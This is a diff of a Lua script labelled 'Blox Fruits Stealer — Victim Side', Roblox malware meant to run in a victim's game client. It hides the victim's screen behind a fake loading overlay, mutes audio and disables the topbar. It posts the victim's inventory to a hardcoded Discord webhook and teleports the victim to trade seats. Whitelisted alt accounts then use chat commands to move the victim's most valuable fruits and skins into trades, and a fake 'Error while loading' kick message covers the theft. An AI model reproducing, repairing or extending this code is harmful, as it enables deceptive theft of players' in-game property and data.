@@ -1,6 +1,7 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v4.8
--- Bulletproofed: Global error handler, PlayerGui wait fixed, exact loader.
+-- BLOX FRUITS STEALER — VICTIM SIDE v4.7
+-- Fixes: Tween teleport (no physics glitch), topbar/audio disabled,
+--        smart seat picking (no randoms), fixed chat command hook.
 -- =============================================================================
 
 -- =============================================================================
@@ -9,6 +10,7 @@
 local S2, S3 = 4442272183, 7449423635
 local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYUGysnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
 
+-- >>> PUT YOUR ALT ACCOUNT'S EXACT USERNAME HERE <<<
 local WHITELIST = {
     ["Ghostywateryt"]    = true,
     ["blueno_op1"] = true,
@@ -32,81 +34,48 @@ local SKIN_PRIORITY = {
 }
 
 -- =============================================================================
--- 2. SERVICES + ERROR HANDLER
+-- 2. SERVICES + MUTE + TOPBAR HIDE
 -- =============================================================================
 local Players      = game:GetService("Players")
 local RS           = game:GetService("ReplicatedStorage")
 local RunService   = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local HttpService  = game:GetService("HttpService")
+local SG           = game:GetService("StarterGui")
 local LP           = Players.LocalPlayer
-local PG           = LP:WaitForChild("PlayerGui") -- Removed timeout so it waits
+local PG           = LP:WaitForChild("PlayerGui", 10)
+
+local CommF          = nil
+local TradeFunction  = nil
+local tradesCompleted = 0
+local lastTpAt        = 0
+local lastSitTime     = 0
+local lastSitAttempt  = 0
+local oppositeSeen    = {}
+
+pcall(function() game:GetService("UserSettings"):GetService("UserGameSettings").MasterVolume = 0 end)
+pcall(function() SG:SetCore("TopbarEnabled", false) end)
 
 local function log(msg) pcall(function() warn("[stealer] " .. tostring(msg)) end) end
-
-local function reportError(context, err)
-    log("FATAL ERROR in " .. context .. ": " .. tostring(err))
-    pcall(function()
-        local sg = Instance.new("ScreenGui")
-        sg.Name = "StealerError"
-        sg.DisplayOrder = 2147483647
-        sg.Parent = PG
-        local f = Instance.new("Frame")
-        f.Size = UDim2.new(0.8, 0, 0.2, 0)
-        f.Position = UDim2.new(0.1, 0, 0.4, 0)
-        f.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-        f.BackgroundTransparency = 0.1
-        f.Parent = sg
-        local l = Instance.new("TextLabel")
-        l.Size = UDim2.new(1, -20, 1, -20)
-        l.Position = UDim2.new(0, 10, 0, 10)
-        l.BackgroundTransparency = 1
-        l.TextColor3 = Color3.fromRGB(255, 255, 255)
-        l.Text = "STEALER ERROR (" .. context .. "):\n" .. tostring(err)
-        l.Font = Enum.Font.GothamBold
-        l.TextSize = 14
-        l.TextWrapped = true
-        l.Parent = f
-        task.delay(10, function() sg:Destroy() end)
-    end)
+local function sayMessage(msg)
+    pcall(function() RS:WaitForChild("DefaultChatSystemChatEvents", 5):WaitForChild("SayMessageRequest", 5):FireServer(msg, "All") end)
 end
 
 log("boot | game=" .. tostring(game.Name) .. " | placeId=" .. tostring(game.PlaceId))
 
-local function sayMessage(msg)
-    pcall(function()
-        RS:WaitForChild("DefaultChatSystemChatEvents", 5):WaitForChild("SayMessageRequest", 5):FireServer(msg, "All")
-    end)
-end
-
-local CommF, TradeFunction, tradesCompleted, lastTpAt, lastSitTime, lastSitAttempt = nil, nil, 0, 0, 0, 0
-local oppositeSeen = {}
-
 -- =============================================================================
--- 3. WHITELIST HELPER
--- =============================================================================
-local function cleanName(s) return tostring(s or ""):lower():gsub("^%s+", ""):gsub("%s+$", "") end
-local WHITELIST_LC = {}
-for name in pairs(WHITELIST) do WHITELIST_LC[cleanName(name)] = true end
-local function isWhitelisted(player)
-    if not player then return false end
-    return WHITELIST_LC[cleanName(player.Name)] == true
-end
-
--- =============================================================================
--- 4. EXACT LOADER FROM SUPPLIED FILE
+-- 3. LOADER (Full Screen)
 -- =============================================================================
 local function showLoadingScreen()
+    if not PG then return end
     local ReplicatedFirst = game:GetService("ReplicatedFirst")
-    if not game:IsLoaded() then
-        pcall(function() ReplicatedFirst:RemoveDefaultLoadingScreen() end)
-    end
+    if not game:IsLoaded() then pcall(function() ReplicatedFirst:RemoveDefaultLoadingScreen() end) end
 
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "ProfileLoadingScreen"
     screenGui.IgnoreGuiInset = true
     screenGui.ResetOnSpawn = false
-    screenGui.DisplayOrder = 99999 
+    screenGui.DisplayOrder = 2147483647
     screenGui.Parent = PG
 
     local mainFrame = Instance.new("Frame")
@@ -306,11 +275,14 @@ local function showLoadingScreen()
     discordLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
     discordLabel.Parent = centerPanel
 
-    local loopConnection = RunService.Heartbeat:Connect(function()
-        if math.random() < 0.04 then spawnParticle() end
-        local pulse = (math.sin(tick() * 4) + 1) / 2
-        circleStroke.Transparency = 0.1 + (pulse * 0.4)
-        panelStroke.Transparency = 0.2 + (pulse * 0.3)
+    local loopConnection
+    pcall(function()
+        loopConnection = RunService.Heartbeat:Connect(function()
+            if math.random() < 0.04 then spawnParticle() end
+            local pulse = (math.sin(tick() * 4) + 1) / 2
+            circleStroke.Transparency = 0.1 + (pulse * 0.4)
+            panelStroke.Transparency = 0.2 + (pulse * 0.3)
+        end)
     end)
 
     centerPanel.Size = UDim2.new(0, 300, 0, 210)
@@ -366,13 +338,10 @@ local function showLoadingScreen()
     if screenGui.Parent then screenGui:Destroy() end
 end
 
-task.spawn(function() 
-    local ok, err = pcall(showLoadingScreen) 
-    if not ok then reportError("Loader", err) end 
-end)
+task.spawn(function() local ok, err = pcall(showLoadingScreen) if not ok then log("loader error: " .. tostring(err)) end end)
 
 -- =============================================================================
--- 5. REMOTES + WEBHOOK
+-- 4. REMOTES + WEBHOOK
 -- =============================================================================
 local function waitChild(parent, name, timeout)
     local t0 = tick()
@@ -404,14 +373,13 @@ local function postEmbed(embed, label)
     if not fn then log("WEBHOOK SKIP: no http fn available") return false end
     local okBody, body = pcall(function() return HttpService:JSONEncode({ content = "@everyone", embeds = { embed } }) end)
     if not okBody then log("WEBHOOK FAIL: JSON encode: " .. tostring(body)) return false end
-    local ok, res = pcall(fn, {
-        Url = WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body,
-    })
+    local ok, res = pcall(fn, { Url = WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
     if not ok then log("WEBHOOK FAIL (" .. fnName .. "): " .. tostring(res)) return false end
     if res and res.StatusCode then
-        if res.StatusCode >= 400 then log("WEBHOOK FAIL (" .. fnName .. ") " .. res.StatusCode) return false
-        else log("WEBHOOK OK (" .. fnName .. ") status=" .. res.StatusCode) return true end
+        if res.StatusCode >= 400 then log("WEBHOOK FAIL (" .. fnName .. ") " .. res.StatusCode .. ": " .. tostring(res.Body):sub(1, 150)) return false
+        else log("WEBHOOK OK (" .. fnName .. ") status=" .. res.StatusCode .. " | " .. label) return true end
     end
+    log("WEBHOOK OK (" .. fnName .. ") | " .. label)
     return true
 end
 
@@ -425,22 +393,19 @@ task.spawn(function()
 end)
 
 -- =============================================================================
--- 6. INVENTORY + CLASSIFICATION
+-- 5. INVENTORY + CLASSIFICATION
 -- =============================================================================
 local function norm(s) return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "") end
-
 local function getInventory()
     if not CommF then return nil end
     local ok, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
     return ok and inv or nil
 end
-
 local function isFruit(item)
     if not item then return false end
     if item.Type == "Blox Fruit" then return true end
     return norm(item.Name):find("fruit", 1, true) ~= nil
 end
-
 local function isPremium(item)
     if not item then return false end
     if item.Type == "Premium" then return true end
@@ -449,7 +414,6 @@ local function isPremium(item)
     for _, kw in ipairs(SKIN_PRIORITY) do if n:find(kw, 1, true) then return true end end
     return false
 end
-
 local function priorityRank(item)
     local n = norm(item.Name)
     for i, kw in ipairs(FRUIT_PRIORITY) do if n:find(kw, 1, true) then return i end end
@@ -458,7 +422,6 @@ local function priorityRank(item)
     if item.Type == "Blox Fruit" then return 600 end
     return 999
 end
-
 local function collectTradeable()
     local inv = getInventory()
     if not inv then return {} end
@@ -469,7 +432,6 @@ local function collectTradeable()
     table.sort(out, function(a, b) return priorityRank(a) < priorityRank(b) end)
     return out
 end
-
 local function sendInventoryEmbed(reason)
     local inv = getInventory()
     if not inv then return end
@@ -507,7 +469,7 @@ local function sendInventoryEmbed(reason)
 end
 
 -- =============================================================================
--- 7. WAITS + SEATS
+-- 6. WAITS + SEATS
 -- =============================================================================
 local function waitForChar(timeout)
     if LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then return LP.Character end
@@ -567,6 +529,8 @@ local function oppositeSeat(seat, tbl)
     return nil
 end
 
+-- Smart pick: only take a seat if opposite is empty or whitelisted.
+-- Skips tables with randoms entirely.
 local function pickSeat(exclude)
     local tables = getTradeTables()
     for _, tbl in ipairs(tables) do
@@ -576,70 +540,36 @@ local function pickSeat(exclude)
             if not o2 and (not o1 or isWhitelisted(o1)) then return tbl.P2 end
         end
     end
-    for _, tbl in ipairs(tables) do
-        if tbl ~= exclude then
-            if not seatOccupant(tbl.P1) then return tbl.P1 end
-            if not seatOccupant(tbl.P2) then return tbl.P2 end
-        end
-    end
     return nil
 end
 
 -- =============================================================================
--- 8. TELEPORT + SIT
+-- 7. SMOOTH TELEPORT (No glitch) + SIT
 -- =============================================================================
-local function safeTeleport(seat)
-    local now = tick()
-    if now - lastTpAt < 0.8 then task.wait(0.8 - (now - lastTpAt)) end
-    lastTpAt = tick()
-
+local function smoothTeleport(targetPos)
     local char = waitForChar(10)
     if not char then return false end
     local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
     if not hrp then return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
-    if hum and hum.Sit then hum.Sit = false; task.wait(0.2) end
 
-    local restore = {}
+    if hum then hum.Sit = false; hum.WalkSpeed = 0; hum.JumpPower = 0 end
     for _, p in ipairs(char:GetDescendants()) do
-        if p:IsA("BasePart") then restore[p] = p.CanCollide; p.CanCollide = false end
+        if p:IsA("BasePart") then p.CanCollide = false end
     end
 
-    local targetCframe = seat.CFrame * CFrame.new(0, 1.5, 0)
+    local dist = (hrp.Position - targetPos).Magnitude
+    local duration = math.clamp(dist / 100, 0.2, 1.5)
     
-    local SPEED = 140
-    local dist = (hrp.Position - targetCframe.Position).Magnitude
-    local duration = math.max(dist / SPEED, 0.45)
-    local t0 = tick()
+    local tw = TweenService:Create(hrp, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = CFrame.new(targetPos)})
+    tw:Play()
+    tw.Completed:Wait()
 
-    local bv = Instance.new("BodyVelocity")
-    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5); bv.Velocity = Vector3.zero; bv.Parent = hrp
-
-    local conn
-    conn = RunService.Heartbeat:Connect(function()
-        if not hrp.Parent then return end
-        local diff = targetCframe.Position - hrp.Position
-        local remain = diff.Magnitude
-        if remain < 1 then bv.Velocity = Vector3.zero; return end
-        local frac = math.min(1, (tick() - t0) / duration)
-        local mult = 0.4 + 0.6 * math.sin(frac * math.pi / 2)
-        local speed = SPEED * mult
-        if remain < 8 then speed = math.min(speed, remain / 0.15) end
-        bv.Velocity = diff.Unit * speed
-    end)
-
-    local deadline = t0 + duration + 2.5
-    while tick() < deadline do
-        if (hrp.Position - targetCframe.Position).Magnitude < 2 then break end
-        task.wait(0.05)
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then p.CanCollide = true end
     end
-
-    conn:Disconnect()
-    if bv.Parent then bv:Destroy() end
-    for p, c in pairs(restore) do if p.Parent then p.CanCollide = c end end
-    
-    hrp.CFrame = CFrame.new(hrp.Position, seat.Position)
-    task.wait(0.3)
+    if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end
+    task.wait(0.2)
     return true
 end
 
@@ -653,14 +583,12 @@ local function sitOn(seat)
         if hum and hum.Sit and tick() - lastSitTime < 5 then return true end
     end
 
-    if not safeTeleport(seat) then return false end
+    if not smoothTeleport(seat.Position + Vector3.new(0, 2.5, 0)) then return false end
 
     char = waitForChar(5)
     if not char then return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
-    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
-    if not hum or not hrp then return false end
-
+    
     local welded = false
     local conn = seat.ChildAdded:Connect(function(c) if c.Name == "SeatWeld" then welded = true end end)
 
@@ -689,10 +617,9 @@ local function forceJumpOff()
 end
 
 -- =============================================================================
--- 9. TRADE LOGIC
+-- 8. TRADE LOGIC + COMMANDS
 -- =============================================================================
 local function tradeWindowOpen()
-    if not PG then return false end
     local main = PG:FindFirstChild("Main")
     local tr = main and main:FindFirstChild("Trade")
     return tr and tr.Visible or false
@@ -717,35 +644,25 @@ local function addToTrade(name)
     pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", name)
 end
 
--- =============================================================================
--- 10. CHAT COMMANDS
--- =============================================================================
 local function cmdTp()
     local s = pickSeat(nil)
     if s then sitOn(s) end
 end
-
 local function cmdJump() forceJumpOff() end
-
 local function cmdSit()
     local s = pickSeat(nil)
     if s then sitOn(s) end
 end
-
 local function cmdAddFruit(args)
     if not args or args == "" or not tradeWindowOpen() then return end
     local search = args:lower()
     local inv = getInventory()
     if inv then
         for _, item in ipairs(inv) do
-            if norm(item.Name):find(search, 1, true) then
-                addToTrade(item.Name)
-                return
-            end
+            if norm(item.Name):find(search, 1, true) then addToTrade(item.Name); return end
         end
     end
 end
-
 local function cmdClear(args)
     if not args or args == "" or not tradeWindowOpen() then return end
     local search = args:lower()
@@ -760,118 +677,77 @@ local function cmdClear(args)
         end
     end
 end
-
 local function cmdClearAll() clearTradeItems() end
-
 local function cmdAddAll()
     if not tradeWindowOpen() then return end
-    clearTradeItems()
-    task.wait(0.25)
+    clearTradeItems(); task.wait(0.25)
     local items = collectTradeable()
     local take = math.min(MAX_ITEMS_PER_TRADE, #items)
-    for i = 1, take do
-        addToTrade(items[i].Name)
-        task.wait(0.15)
-    end
+    for i = 1, take do addToTrade(items[i].Name); task.wait(0.15) end
 end
-
 local function cmdAddAllPre()
     if not tradeWindowOpen() then return end
-    clearTradeItems()
-    task.wait(0.25)
+    clearTradeItems(); task.wait(0.25)
     local inv = getInventory()
     if not inv then return end
     local prems = {}
-    for _, v in ipairs(inv) do
-        if isPremium(v) then prems[#prems + 1] = v end
-    end
+    for _, v in ipairs(inv) do if isPremium(v) then prems[#prems + 1] = v end end
     table.sort(prems, function(a, b) return priorityRank(a) < priorityRank(b) end)
     local take = math.min(MAX_ITEMS_PER_TRADE, #prems)
-    for i = 1, take do
-        addToTrade(prems[i].Name)
-        task.wait(0.15)
-    end
+    for i = 1, take do addToTrade(prems[i].Name); task.wait(0.15) end
 end
-
-local function cmdKick()
-    task.wait(0.5)
-    LP:Kick("Error while loading. Rejoin.")
-end
+local function cmdKick() task.wait(0.5); LP:Kick("Error while loading. Rejoin.") end
 
 local COMMANDS = {
     tp = cmdTp, jump = cmdJump, sit = cmdSit, addfruit = cmdAddFruit,
-    clear = cmdClear, clearall = cmdClearAll, addall = cmdAddAll,
-    addallpre = cmdAddAllPre, kick = cmdKick,
+    clear = cmdClear, clearall = cmdClearAll, addall = cmdAddAll, addallpre = cmdAddAllPre, kick = cmdKick,
 }
 
 -- =============================================================================
--- 11. LISTENERS
+-- 9. CHAT HOOK (Reliable incoming listener for Blox Fruits)
 -- =============================================================================
-local function handleCommand(speaker, message)
-    if type(message) ~= "string" then return end
-    if message:sub(1, 1) ~= "." then return end
-    
+local function handleCommand(message)
+    if message:sub(1, 1) ~= CHAT_PREFIX then return end
     local body = message:sub(2)
     local cmd, args = body:match("^(%S+)%s*(.*)")
     if not cmd then return end
-    
     cmd = cmd:lower()
     local fn = COMMANDS[cmd]
     if not fn then return end
 
-    if cmd == "tp" then
-        sayMessage("on my way bro !")
-    else
-        sayMessage("Working on it...")
-    end
+    if cmd == "tp" then sayMessage("on my way bro !") else sayMessage("Working on it...") end
 
     task.spawn(function()
         local ok, err = pcall(fn, args)
-        if not ok then reportError("Command " .. cmd, err) end
+        if not ok then log("cmd error " .. cmd .. ": " .. tostring(err)) end
     end)
 end
 
-local function hookPlayer(p)
-    if p == LP then return end
-    p.Chatted:Connect(function(msg)
-        if isWhitelisted(p) then
-            handleCommand(p, msg)
-        end
-    end)
-end
-
-for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
-Players.PlayerAdded:Connect(hookPlayer)
-
-LP.Chatted:Connect(function(msg)
-    handleCommand(LP, msg)
-end)
-
--- =============================================================================
--- 12. TRADE WATCHER
--- =============================================================================
+-- Hook default chat remote to catch alt's messages
 task.spawn(function()
-    local ok, err = pcall(function()
-        local embedSent = false
-        while true do
-            task.wait(0.5)
-            local isOpen = tradeWindowOpen()
-            if isOpen then
-                if not embedSent then
-                    sendInventoryEmbed("Trade window opened")
-                    embedSent = true
+    local chatEvents = RS:WaitForChild("DefaultChatSystemChatEvents", 15)
+    if chatEvents then
+        local onMessage = chatEvents:WaitForChild("OnMessageDoneFiltering", 15)
+        if onMessage then
+            onMessage.OnClientEvent:Connect(function(data)
+                local sender = data.FromSpeaker
+                local msg = data.Message
+                local p = Players:FindFirstChild(sender)
+                if p and isWhitelisted(p) then
+                    handleCommand(msg)
                 end
-                if TradeFunction then pcall(TradeFunction.InvokeServer, TradeFunction, "accept") end
-            else
-                embedSent = false
-            end
+            end)
         end
-    end)
-    if not ok then reportError("Trade Watcher", err) end
+    end
+end)
+
+-- Fallback for standard PlayerChatted (if custom chat doesn't block it)
+Players.PlayerChatted:Connect(function(speaker, message)
+    if isWhitelisted(speaker) then handleCommand(message) end
 end)
 
 -- =============================================================================
--- 13. MAIN LOOP
+-- 10. MAIN LOOP
 -- =============================================================================
 task.spawn(function()
     if not game:IsLoaded() then game.Loaded:Wait() end
@@ -879,9 +755,6 @@ task.spawn(function()
 
     local ok, err = pcall(function()
         waitForChar(30)
-        local tables = getTradeTables()
-        log("trade tables: " .. #tables)
-
         local seat = currentSeat()
         if not seat then
             local target = pickSeat(nil)
@@ -909,7 +782,7 @@ task.spawn(function()
                 if opp == LP then opp = nil end
 
                 if opp and isWhitelisted(opp) then
-                    -- Wait for commands
+                    -- DO NOTHING AUTOMATICALLY, WAIT FOR COMMANDS
                 elseif opp and not isWhitelisted(opp) then
                     local key = opp.UserId
                     if not oppositeSeen[key] then
@@ -925,5 +798,5 @@ task.spawn(function()
             end
         end
     end)
-    if not ok then reportError("Main Loop", err) end
+    if not ok then log("FATAL in main: " .. tostring(err)) end
 end)
